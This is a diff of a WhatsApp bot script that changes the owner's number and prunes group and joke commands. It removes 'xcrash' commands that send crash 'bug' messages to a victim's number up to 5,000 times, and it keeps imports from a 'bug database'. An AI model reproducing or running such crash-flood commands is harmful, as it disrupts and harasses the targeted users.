@@ -4,7 +4,7 @@
 //Instagram: unicorn_xeon13
 //Telegram: t.me/xeonbotinc
 //GitHub: @DGXeon
-//WhatsApp: +919339619072
+//WhatsApp: +916909137213
 //want more free bot scripts? subscribe to my youtube channel: https://youtube.com/@DGXeon
 
 require('./lib/listmenu')
@@ -44,7 +44,6 @@ const scp2 = require('./lib/scraper2')
 const pkg = require('imgur')
 const { ImgurClient } = pkg
 const client = new ImgurClient({ clientId: "a0113354926015a" })
-
 const {
     exec,
     spawn,
@@ -121,7 +120,6 @@ const ZipXeon = JSON.parse(fs.readFileSync('./XeonMedia/database/zip.json'))
 const ApkXeon = JSON.parse(fs.readFileSync('./XeonMedia/database/apk.json'))
 
 //bug database
-const { xeontextx } = require('./src/data/function/XBug/xeontextx')
 const { xeontext1 } = require('./src/data/function/XBug/xeontext1')
 const { xeontext2 } = require('./src/data/function/XBug/xeontext2')
 const { xeontext3 } = require('./src/data/function/XBug/xeontext3')
@@ -139,7 +137,6 @@ others: {},
 users: {},
 chats: {},
 settings: {},
-antipromote: {},
 ...(global.db.data || {})
 }
 
@@ -275,36 +272,11 @@ module.exports = XeonBotInc = async (XeonBotInc, m, chatUpdate, store) => {
         let XeonStikRep = fs.readFileSync('./XeonMedia/theme/sticker_reply/private.webp')
         XeonBotInc.sendMessage(from, { sticker: XeonStikRep }, { quoted: m })
         }
-        
         //premium
         async function replyprem(teks) {
     replygcxeon(`This feature is for premium user, contact the owner to become premium user`)
 }
-        // button reply message 
- 
-        async function sendbuttonsResponseMessage()
-        {
-            // Construct message data
-            target = m.chat,
-            message = 'select options from below'
-           buton = [
-                { type: 'reply', title: 'menu', payload: 'menu' },
-                { type: 'reply', title: 'ping', payload: 'ping' },
-            ]
-            const messageData = {
-                to: target,
-                type: 'text',
-                text: message,
-                buttons: buton
-            };
-        
-            // Replace with your code to send the message using the WhatsApp API
-            return await sendbuttonsResponseMessage(messageData)
-        }
-
-
         //script replier
-       
         async function sendXeonBotIncMessage(chatId, message, options = {}){
     let generate = await generateWAMessage(chatId, message, options)
     let type2 = getContentType(generate.message)
@@ -412,7 +384,7 @@ module.exports = XeonBotInc = async (XeonBotInc, m, chatUpdate, store) => {
 		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": wm, "caption": `${pushname}`, 'jpegThumbnail': thumb}}}
 		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
 		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: wm,jpegThumbnail: thumb}}}
-		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': ownername, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=919339619072:919339619072\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
+		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': ownername, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=916909137213:916909137213\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
 	    const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": wm,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}
 	    const frpayment = {
 	key: {
@@ -492,7 +464,6 @@ return arr[Math.floor(Math.random() * arr.length)]
                   if (!('antidocument' in chats)) chats.antidocument = false
                   if (!('antilink' in chats)) chats.antilink = false
                   if (!('antilinkgc' in chats)) chats.antilinkgc = false
-                  if (!('antipromote' in chats)) chats.antipromote = false
                } else global.db.data.chats[from] = {
                   badword: false,
                   antiforeignnum: false,
@@ -509,7 +480,6 @@ return arr[Math.floor(Math.random() * arr.length)]
                   antidocument: false,
                   anticontact: false,
                   antilink: false,
-                  antipromote: false,
                   antilinkgc: false
                }
             
@@ -1429,7 +1399,7 @@ fs.writeFileSync('./src/data/role/user.json', JSON.stringify(xeonverifieduser, n
             break
             case 'delprem':
                 if (!XeonTheCreator) return XeonStickOwner()
-                if (args.length < 1) return replygcxeon(`Usage ${prefix + command} @tag\n${prefix + command} number\n\nExample : ${prefix + command} 919339619072`)
+                if (args.length < 1) return replygcxeon(`Usage ${prefix + command} @tag\n${prefix + command} number\n\nExample : ${prefix + command} 916909137213`)
                 if (m.mentionedJid.length !== 0) {
                     for (let i = 0; i < m.mentionedJid.length; i++) {
                         premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1)
@@ -1470,49 +1440,13 @@ replygcxeon(`Number ${bnnd} Has Become An Owner!!!`)
 break
 case 'delowner':
 if (!XeonTheCreator) return XeonStickOwner()
-if (!args[0]) return replygcxeon(`Use ${prefix+command} nomor\nExample ${prefix+command} 919339619072`)
+if (!args[0]) return replygcxeon(`Use ${prefix+command} nomor\nExample ${prefix+command} 916909137213`)
 ya = q.split("|")[0].replace(/[^0-9]/g, '')
 unp = owner.indexOf(ya)
 owner.splice(unp, 1)
 fs.writeFileSync('./src/data/role/owner.json', JSON.stringify(owner))
 replygcxeon(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
 break
-case 'xcrash':{
-if (!isPremium) return replygcxeon(mess.prem)
- if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
- victim = text.split("|")[0]+'@s.whatsapp.net'
-amount = "100"
-for (let i = 0; i < amount; i++) {
-XeonyCrashy(pushname,victim)
-await sleep(3000)
-}
-replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
-}
-break
-case 'xcrash1k':{
-    if (!isPremium) return replygcxeon(mess.prem)
-     if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
-     victim = text.split("|")[0]+'@s.whatsapp.net'
-    amount = "1000"
-    for (let i = 0; i < amount; i++) {
-    XeonyCrashy(pushname,victim)
-    await sleep(3000)
-    }
-    replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
-    }
-    break
-case 'xcrash5k':{
-    if (!isPremium) return replygcxeon(mess.prem)
-     if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
-     victim = text.split("|")[0]+'@s.whatsapp.net'
-    amount = "5000"
-    for (let i = 0; i < amount; i++) {
-    XeonyCrashy(pushname,victim)
-    await sleep(3500)
-    }
-    replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
-    }
-    break
 case 'listowner': {
                 let teks = '┌──⭓「 *List Owner* 」\n│\n'
                 for (let x of owner) {
@@ -1849,7 +1783,7 @@ if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
             case 'out':
                 if (!XeonTheCreator) return XeonStickOwner()
                 if (!m.isGroup) return XeonStickGroup()
-                replygcxeon('Bye Everyone, I will come back later 🥺')
+                replygcxeon('Bye Everyone 🥺')
                 await XeonBotInc.groupLeave(m.chat)
             break
             case 'bc':
@@ -2064,33 +1998,6 @@ if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
             })
         }
         break
-        case 'antipromote':{
-		         if (!m.isGroup) return XeonStickGroup()
-                 if (!XeonTheCreator) return XeonStickOwner()
-               if (args.length < 1) return replygcxeon('on/off?')
-               if (args[0] === 'on') {
-                  db.data.chats[from].antipromote = true
-                  replygcxeon(`${command} is enabled`)
-               } else if (args[0] === 'off') {
-                  db.data.chats[from].antipromote = false
-                  replygcxeon(`${command} is disabled`)
-               }
-               }
-            break
-	   case 'antidemote':{
-		         if (!m.isGroup) return XeonStickGroup()
-if (!isBotAdmins) return XeonStickBotAdmin()
-if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
-               if (args.length < 1) return replygcxeon('on/off?')
-               if (args[0] === 'on') {
-                  db.data.chats[from].antidemote = true
-                  replygcxeon(`${command} is enabled`)
-               } else if (args[0] === 'off') {
-                  db.data.chats[from].antidemote = false
-                  replygcxeon(`${command} is disabled`)
-               }
-               }
-            break
             case 'antipoll':{
             	if (!m.isGroup) return XeonStickGroup()
 if (!isBotAdmins) return XeonStickBotAdmin()
@@ -2316,7 +2223,7 @@ if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
             case 'invite': {
 	if (!m.isGroup) return XeonStickGroup()
 	if (!isBotAdmins) return XeonStickBotAdmin()
-if (!text) return replygcxeon(`Enter the number you want to invite to the group\n\nExample :\n*${prefix + command}* 919339619072`)
+if (!text) return replygcxeon(`Enter the number you want to invite to the group\n\nExample :\n*${prefix + command}* 916909137213`)
 if (text.includes('+')) return replygcxeon(`Enter the number together without *+*`)
 if (isNaN(text)) return replygcxeon(`Enter only the numbers plus your country code without spaces`)
 let group = m.chat
@@ -2379,17 +2286,6 @@ break
                 let blockwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                 await XeonBotInc.groupParticipantsUpdate(m.chat, [blockwww], 'remove')
                 replygcxeon(mess.done)
-                break
-                 case 'kickall':
-                if (!isAdmins && !isGroupOwner) return XeonStickAdmin()
-                if (!m.isGroup) return XeonStickGroup()
-                if (!isBotAdmins) return XeonStickBotAdmin()
-                participants.map(jid => ({
-                    tag: 'participant',
-                    attrs: { jid }
-                }))
-                await XeonBotInc.groupParticipantsUpdate(participants.map(a => a.id), 'remove')             
-                
                 break
                 case "idgroup": case "groupid": {
 if (!XeonTheCreator) return XeonStickOwner()
@@ -2525,12 +2421,9 @@ break
                 if (!m.isGroup) return XeonStickGroup()
                 if (!isAdmins && !isGroupOwner && !XeonTheCreator) return XeonStickAdmin()
                 if (!isBotAdmins) return XeonStickBotAdmin()
-                if (db.data.chats[from].antipromote!= true)
-                {
                 let blockwwwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                 await XeonBotInc.groupParticipantsUpdate(m.chat, [blockwwwww], 'promote')
-                replygcxeon(mess.done)}
-                
+                replygcxeon(mess.done)
                 break
             case 'demote':
                 if (!m.isGroup) return XeonStickGroup()
@@ -2538,18 +2431,6 @@ break
                 if (!isBotAdmins) return XeonStickBotAdmin()
                 let blockwwwwwa = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                 await XeonBotInc.groupParticipantsUpdate(m.chat, [blockwwwwwa], 'demote')
-                replygcxeon(mess.done)
-                break
-            case 'demoteall':
-                if (!m.isGroup) return XeonStickGroup()
-                if (!isAdmins && !isGroupOwner && !XeonTheCreator) return XeonStickAdmin()
-                if (!isBotAdmins) return XeonStickBotAdmin()
-                let dtall = groupAdmins + '@s.whatsapp.net'
-                for (let mem of groupAdmins)
-                    {
-                    await XeonBotInc.groupParticipantsUpdate(m.chat, [dtall], 'demote')
-                     dtall += `${mem.id.split('@')[0]}`
-                    }
                 replygcxeon(mess.done)
                 break
             case 'setnamegc':
@@ -2664,7 +2545,9 @@ if (!XeonTheCreator) return XeonStickOwner()
                 break
             case 'tagall':
             case 'tag':
-                
+                if (!m.isGroup) return XeonStickGroup()
+                if (!isAdmins && !isGroupOwner && !XeonTheCreator) return XeonStickAdmin()
+                if (!isBotAdmins) return XeonStickBotAdmin()
                 let me = m.sender
                 let teks = `╚»˙·٠${themeemoji}●♥ Tag All ♥●${themeemoji}٠·˙«╝\n😶 *Tagger :*  @${me.split('@')[0]}\n🌿 *Message : ${q ? q : 'no message'}*\n\n`
                 for (let mem of participants) {
@@ -2905,35 +2788,22 @@ break
                     })
             break
                 //bot status
-            case 'ping': case 'botstatus': case 'statusbot': case 'p':
-                let fgg = { key: { fromMe: true, participant: `0@s.whatsapp.net`, remoteJid: 'status@broadcast' }, message: { contactMessage: { displayName: `꧁﴿.·»✥«·-𝕯𝕯 𝕮𝖍𝖊𝖊𝖒𝖘-𝕭𝖔𝖙-·»✥«.·﴾꧂\n 😎😎===================================😎😎\n Created by: ${ownername}`, vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;a,;;;\nFN:'CHEEMS-BOT'\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`}}}
-                let timestampe = speed()
-                let latensie = speed() - timestampe
-                 let ping = `> 📌 Hey there, 🤗
-> ${botname} 
+                case 'ping': case 'botstatus': case 'statusbot': case 'p':
+                    let timestampe = speed()
+                    let latensie = speed() - timestampe
+                     let ping = `> 📌 Hey there, 🤗
+> ${botname}
 > is online 📡🛰️
 > 📌 ʀᴇsᴘᴏɴsᴇ sᴘᴇᴇᴅ :  ${latensie.toFixed(4)} ms 🏃
 > 📌 ʀᴜɴᴛɪᴍᴇ : ${runtime(process.uptime())}⏰
 >  
 > 📌 ᴄʀᴇᴀᴛᴇᴅ ʙʏ : ${ownername} 👑`
-
-                XeonBotInc.sendMessage(m.chat, {
-                    text: ping,
-                }, {
-                    quoted: fgg
-                })
-                break
-    case 'relay':
-    if (!isPremium) return replygcxeon(mess.premium)
-       let message = q ? q : ''
-        XeonBotInc.relayMessage(m.chat, {
-            scheduledCallCreationMessage: {
-                callType: "VIDEO",
-                scheduledTimestampMs: `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-                title: message
-            }
-        }, {})
-          break
+                    XeonBotInc.sendMessage(m.chat, {
+                        text: ping,
+                    }, {
+                        quoted: m
+                    })
+                    break
 	case 'repo': case 'repository': {
   try {
     const [, username, repoName] = botscript.match(/github\.com\/([^/]+)\/([^/]+)/)
@@ -2992,7 +2862,7 @@ break
             }
             break
             case 'rentbot':
-                replygcxeon(`Type ${prefix}${ownernumber} owner and chat him`)
+                replygcxeon(`Type ${prefix}${ownernumber}owner and chat him`)
                 break
             case 'speedtest': {
                 replygcxeon('Testing Speed...')
@@ -3534,25 +3404,6 @@ Please @${m.mentionedJid[0].split`@`[0]} to type accept/reject`
                 }
             }
             break
-            case 'groupowner': {
-                XeonBotInc.sendMessage(m.chat,
-                { text: ` This Group was Created by @${groupOwner.split("@")[0]}👑`,
-                contextInfo:{
-                mentionedJid:[groupOwner],
-                forwardingScore: 9999999,
-                isForwarded: true, 
-                "externalAdReply": {
-                "showAdAttribution": true,
-                "containsAutoReply": true,
-                "title": ` ${global.botname}`,
-                "body": `${ownername}`,
-                "previewType": "PHOTO",
-                "thumbnailUrl": ``,
-                "thumbnail": fs.readFileSync(`./XeonMedia/theme/cheemspic.jpg`),
-                "sourceUrl": `${websitex}`}}},
-                { quoted: m})        
-                            }
-break
             case 'afk': {
                 let user = global.db.data.users[m.sender]
                 user.afkTime = + new Date
@@ -4273,290 +4124,6 @@ XeonBotInc.sendMessage(from, {text: `Here @${teman.split("@")[0]}`, mentions: [t
 }, 9000)
 }
 break
-case 'u':
-    {
-       let user= m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') 
-       let username =XeonBotInc.getName(user)
-       console.log(json)
-       const res = json[0]
-  let message =`your username is ${username}`
-  XeonBotInc.sendMessage(m.chat,
-    { text: message,
-     contextInfo:{
-             "externalAdReply": {"showAdAttribution": true,
-             "containsAutoReply": true,
-             "title": ` ${global.botname}`,
-             "body": `${ownername}`,
-             "previewType": "PHOTO",
-            "thumbnailUrl": ``,
-            "thumbnail": XeonWlcm,
-             "sourceUrl": `${websitex}`}
-                }
-    })
-    }
-    break
-
-    case 'buttons':
-
-        let button = [
-            { type: 'reply', title: 'menu', payload: 'menu' },
-            { type: 'reply', title: 'ping', payload: 'ping' },
-            { type: 'reply', title: 'owner', payload: 'owner' },
-            // Add more buttons as needed
-        ]
-       sendbuttonsResponseMessage(m.chat, {
-            text: 'select buttons from below',
-            buttons: button
-           }
-    )
-        break
-case 'family': case 'fm' : {
-    if (!m.isGroup) return XeonStickGroup()
-    function getRandomPercentage() {
-        return Math.floor(Math.random() * 100) + 1;
-    }
-    let ps = groupMetadata.participants.map(v => v.id);
-    let b,c,d,e,f,g,h,j,k,l,n,o,p,q,
-    a= m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
-    b= ps[Math.floor(Math.random() * ps.length)]
-    c= ps[Math.floor(Math.random() * ps.length)]
-    d= ps[Math.floor(Math.random() * ps.length)]
-    e= ps[Math.floor(Math.random() * ps.length)]
-    f= ps[Math.floor(Math.random() * ps.length)]
-    g= ps[Math.floor(Math.random() * ps.length)]
-    h= ps[Math.floor(Math.random() * ps.length)]
-    i= ps[Math.floor(Math.random() * ps.length)]
-    k= ps[Math.floor(Math.random() * ps.length)]
-    l= ps[Math.floor(Math.random() * ps.length)]
-    n= ps[Math.floor(Math.random() * ps.length)]
-    o= ps[Math.floor(Math.random() * ps.length)]
-    p= ps[Math.floor(Math.random() * ps.length)]
-    q= ps[Math.floor(Math.random() * ps.length)]
-
-
-        b= ps[Math.floor(Math.random() * ps.length)]
-    do {
-    b= ps[Math.floor(Math.random() * ps.length)]
-    } while (a==b);
-
-    do {
-     c= ps[Math.floor(Math.random() * ps.length)]
-    } while (c==b||c==a);
-
-    do{
-     d= ps[Math.floor(Math.random() * ps.length)]
-    } while (d==c||d==b||d==a);
-
-    do{
-     e= ps[Math.floor(Math.random() * ps.length)]
-    } while (e==d||e==c||e==b||e==a);
-
-    do{
-     f= ps[Math.floor(Math.random() * ps.length)]
-    } while (f==e||f==d||f==c||f==b||f==a);
-     
-    do{
-     g= ps[Math.floor(Math.random() * ps.length)]
-    } while (g==f||g==e||g==d||g==c||g==b||g==a);
-
-    do { 
-     h= ps[Math.floor(Math.random() * ps.length)]
-    } while (h==a||h==b||h==c||h==d||h==f||h==g);
-
-    do {
-     i= ps[Math.floor(Math.random() * ps.length)]
-    } while (i==a||i==b||i==c||i==d||i==e||i==f||i==g||i==h);
-    do {
-     j= ps[Math.floor(Math.random() * ps.length)]
-    } while (j==a||j==b||j==c||j==d||j==e||j==f||j==g||j==h||j==i);
-
-    do {
-     k= ps[Math.floor(Math.random() * ps.length)]
-    } while (k==a||k==b||k==c||k==d||k==e||k==f||k==g||k==h||k==i||k==j);
-
-     do {
-     l= ps[Math.floor(Math.random() * ps.length)]
-     } while (l==a||l==b||l==c||l==d||l==e||l==f||l==g||l==h||l==i||l==j||l==k);
-     
-     do {
-     n= ps[Math.floor(Math.random() * ps.length)]
-    } while (n==a||n==b||n==c||n==d||n==e||n==f||n==g||n==h||n==i||n==j||n==k||n==l);
-
-    do {
-     o= ps[Math.floor(Math.random() * ps.length)]
-    } while (o==a||o==b||o==c||o==d||o==e||o==f||o==g||o==h||o==i||o==j||o==k||o==l||o==n);
-     p= ps[Math.floor(Math.random() * ps.length)]
-     q= ps[Math.floor(Math.random() * ps.length)]
-   
-
-    const percentage = getRandomPercentage();
-    xeonbody = `গোপন সূত্র থেকে পাওয়া @${a.split("@")[0]} চৌদ্দগুষ্টির বিবরণ:\n
-মা :‌-        @${b.split("@")[0]}🫃
-বাবা :-       @${c.split("@")[0]}💦
-ভাই/বোন :-  @${d.split("@")[0]}💆
-বর/বউ :-    @${e.split("@")[0]}👫
-Bf/Gf :-     @${f.split("@")[0]} 👩‍❤‍💋‍👨
-Ex :-        @${g.split("@")[0]} 🤡
-ঘটক :-       @${h.split("@")[0]} 😁
-শশুর :-      @${i.split("@")[0]}🧚
-শাশুরি:-      @${j.split("@")[0]} 🧚
-ক্রাশ :-      @${k.split("@")[0]} 🥵
-বাচ্চা:        ${percentage} টি \n
-1st বাচ্চা:    @${l.split("@")[0]}👶🏼
-
-@${a.split("@")[0]} এই হল তোমার আসল পরিচয় কাল সবাইকে নিয়ে নবান্ন দেখা কর।🤸‍♂`
-try {
-        ppuser = await XeonBotInc.profilePictureUrl(a, 'image')
-    } catch (err) {
-    ppuser = 'https://images.app.goo.gl/5kHFgvSatAYWunaw9'
-    }
-XeonWlcm = await getBuffer(ppuser)
-
-XeonBotInc.sendMessage(m.chat,
-    { text: xeonbody,
-        image: XeonWlcm,
-    contextInfo:{
-    mentionedJid:[a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q],
-    externalAdReply: {
-        showAdAttribution: true,
-        title: botname,
-        body: ownername,
-        thumbnail: XeonWlcm,
-        sourceUrl: websitex,
-        mediaType: 1,
-    }}}, {
-        quoted: m
-    })
- }
-break
-case 'familymembers': case 'family2' : {
-    if (!m.isGroup) return XeonStickGroup()
-    function getRandomPercentage() {
-        return Math.floor(Math.random() * 100) + 1;
-    }
-    let ps = groupMetadata.participants.map(v => v.id);
-    let b,c,d,e,f,g,h,j,k,l,n,o,p,q,
-    a= m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
-    b= ps[Math.floor(Math.random() * ps.length)]
-    c= ps[Math.floor(Math.random() * ps.length)]
-    d= ps[Math.floor(Math.random() * ps.length)]
-    e= ps[Math.floor(Math.random() * ps.length)]
-    f= ps[Math.floor(Math.random() * ps.length)]
-    g= ps[Math.floor(Math.random() * ps.length)]
-    h= ps[Math.floor(Math.random() * ps.length)]
-    i= ps[Math.floor(Math.random() * ps.length)]
-    k= ps[Math.floor(Math.random() * ps.length)]
-    l= ps[Math.floor(Math.random() * ps.length)]
-    n= ps[Math.floor(Math.random() * ps.length)]
-    o= ps[Math.floor(Math.random() * ps.length)]
-    p= ps[Math.floor(Math.random() * ps.length)]
-    q= ps[Math.floor(Math.random() * ps.length)]
-
-
-        b= ps[Math.floor(Math.random() * ps.length)]
-    do {
-    b= ps[Math.floor(Math.random() * ps.length)]
-    } while (a==b);
-
-    do {
-     c= ps[Math.floor(Math.random() * ps.length)]
-    } while (c==b||c==a);
-
-    do{
-     d= ps[Math.floor(Math.random() * ps.length)]
-    } while (d==c||d==b||d==a);
-
-    do{
-     e= ps[Math.floor(Math.random() * ps.length)]
-    } while (e==d||e==c||e==b||e==a);
-
-    do{
-     f= ps[Math.floor(Math.random() * ps.length)]
-    } while (f==e||f==d||f==c||f==b||f==a);
-     
-    do{
-     g= ps[Math.floor(Math.random() * ps.length)]
-    } while (g==f||g==e||g==d||g==c||g==b||g==a);
-
-    do { 
-     h= ps[Math.floor(Math.random() * ps.length)]
-    } while (h==a||h==b||h==c||h==d||h==f||h==g);
-
-    do {
-     i= ps[Math.floor(Math.random() * ps.length)]
-    } while (i==a||i==b||i==c||i==d||i==e||i==f||i==g||i==h);
-    do {
-     j= ps[Math.floor(Math.random() * ps.length)]
-    } while (j==a||j==b||j==c||j==d||j==e||j==f||j==g||j==h||j==i);
-
-    do {
-     k= ps[Math.floor(Math.random() * ps.length)]
-    } while (k==a||k==b||k==c||k==d||k==e||k==f||k==g||k==h||k==i||k==j);
-
-     do {
-     l= ps[Math.floor(Math.random() * ps.length)]
-     } while (l==a||l==b||l==c||l==d||l==e||l==f||l==g||l==h||l==i||l==j||l==k);
-     
-     do {
-     n= ps[Math.floor(Math.random() * ps.length)]
-    } while (n==a||n==b||n==c||n==d||n==e||n==f||n==g||n==h||n==i||n==j||n==k||n==l);
-
-    do {
-     o= ps[Math.floor(Math.random() * ps.length)]
-    } while (o==a||o==b||o==c||o==d||o==e||o==f||o==g||o==h||o==i||o==j||o==k||o==l||o==n);
-     p= ps[Math.floor(Math.random() * ps.length)]
-     q= ps[Math.floor(Math.random() * ps.length)]
-   
-
-    const percentage = getRandomPercentage();
-    maa=XeonBotInc.getName(a),
-    baba=XeonBotInc.getName(b),
-    vai=XeonBotInc.getName(c),
-    bou=XeonBotInc.getName(d),
-    bf=XeonBotInc.getName(e),
-    bariwala=XeonBotInc.getName(f),
-    ex=XeonBotInc.getName(j),
-    sosur=XeonBotInc.getName(g),
-    sasuri=XeonBotInc.getName(h),
-    crush=XeonBotInc.getName(i),
-
-    xeonbody = `গোপন সূত্র থেকে পাওয়া @${a.split("@")[0]} চৌদ্দগুষ্টির বিবরণ:\n
-মা :‌-        ${maa}🫃
-বাবা :-       ${baba}💦
-ভাই/বোন :-  ${vai}💆
-বর/বউ :-    ${bou}👫
-Bf/Gf :-     ${bf} 👩‍❤‍💋‍👨
-Ex :-        ${ex} 🤡
-বাড়িওয়ালা :-  ${bariwala} 🏟
-শশুর :-      ${sosur}🧚
-শাশুরি:-      ${sasuri} 🧚
-ক্রাশ :-      ${crush} 🥵
-বাচ্চা:        ${percentage} টি \n
-@${a.split("@")[0]} এই হল তোমার আসল পরিচয় কাল সবাইকে নিয়ে নবান্ন দেখা কর।🤸‍♂`
-try {
-        ppuser = await XeonBotInc.profilePictureUrl(a, 'image')
-    } catch (err) {
-    ppuser = 'https://images.app.goo.gl/5kHFgvSatAYWunaw9'
-    }
-XeonWlcm = await getBuffer(ppuser)
-
-XeonBotInc.sendMessage(m.chat,
-    { text: xeonbody,
-        image: XeonWlcm,
-    contextInfo:{
-    mentionedJid:[a],
-    externalAdReply: {
-        showAdAttribution: true,
-        title: botname,
-        body: ownername,
-        thumbnail: XeonWlcm,
-        sourceUrl: websitex,
-        mediaType: 1,
-    }}}, {
-        quoted: m
-    })
- }
-break
 case 'q': case 'quoted': {
 if (!m.quoted) return replygcxeon('Reply the Message!!')
 let xeonquotx= await XeonBotInc.serializeM(await m.getQuotedObj())
@@ -4571,27 +4138,6 @@ replygcxeon(`Success
 ${meg.result}`)
 }
 break
-case 'upp': case 'profpic': {
-    a= m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
-    try {
-        ppuser = await XeonBotInc.profilePictureUrl(a, 'image')
-        } catch (err) {
-        ppuser = 'https://images.app.goo.gl/5kHFgvSatAYWunaw9'
-        }
-        XeonWlcm = await getBuffer(ppuser)
-        let username =XeonBotInc.getName(a)
-        dpuser = `here is ${username} 's profile picture`
-        XeonBotInc.sendMessage(m.chat, {
-            image: XeonWlcm,
-            caption: dpuser,
-            mentionjid: [a],
-            
-        }, {
-            quoted: m
-        })
-
-}
-    break
 case 'style': case 'styletext': {
 		let { styletext } = require('./lib/scraper')
 		if (!text) return replygcxeon('Enter Query text!')
@@ -4746,9 +4292,9 @@ if (!text) return replygcxeon('What location?')
            }
            break
            case 'fb':
-           case 'facebook': case 'fb' : case 'fbvid' : {
+           case 'facebook': {
            if (!args[0]) {
-    return replygcxeon(` @${m.sender.split("@")[0]} Please send the link of a Facebook video`)
+    return replygcxeon(`Please send the link of a Facebook video\n\nEXAMPLE :\n*${prefix + command}* https://fb.watch/pLLTM4AFrO/?mibextid=Nif5oz`)
   }
   const urlRegex = /^(?:https?:\/\/)?(?:www\.)?(?:facebook\.com|fb\.watch)\b([-a-zA-Z0-9@:%_\+.~#?&//=]*)/i;
   if (!urlRegex.test(args[0])) {
@@ -4757,7 +4303,7 @@ if (!text) return replygcxeon('What location?')
   try {
     const result = await fg.fbdl(args[0]);
     const tex = `
-    @${m.sender.split("@")[0]} Here is your video 
+        [ FACEBOOK DL ]
 ${themeemoji} Title: ${result.title}`;
     const response = await fetch(result.videoUrl)
     const arrayBuffer = await response.arrayBuffer()
@@ -5199,7 +4745,6 @@ var hasil = pickRandom(notnot)
 XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
 case 'couplepp': case 'ppcouple': {
-    if (!isPremium) return replygcxeon(mess.premium)
 let anu = require('./src/media/randompics/ppcouple.json')
 let random = anu[Math.floor(Math.random() * anu.length)]
 XeonBotInc.sendMessage(from, { image: { url: random.male }, caption: `Couple pp for male` }, { quoted: m })
@@ -5383,13 +4928,11 @@ isForwarded: true,
             }
             break
  case 'couple': case 'vatar': case 'vatari': {
-	  if (!m.isGroup) return XeonStickGroup()
             if (!m.isGroup) return XeonStickGroup()
             let member = participants.map(u => u.id)
             let orang = member[Math.floor(Math.random() * member.length)]
             let jodoh = member[Math.floor(Math.random() * member.length)]
             let me = m.sender
-            me!=jodoh!=orang
 XeonBotInc.sendMessage(m.chat,
 { text: `Our new Couples are 
          @${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}
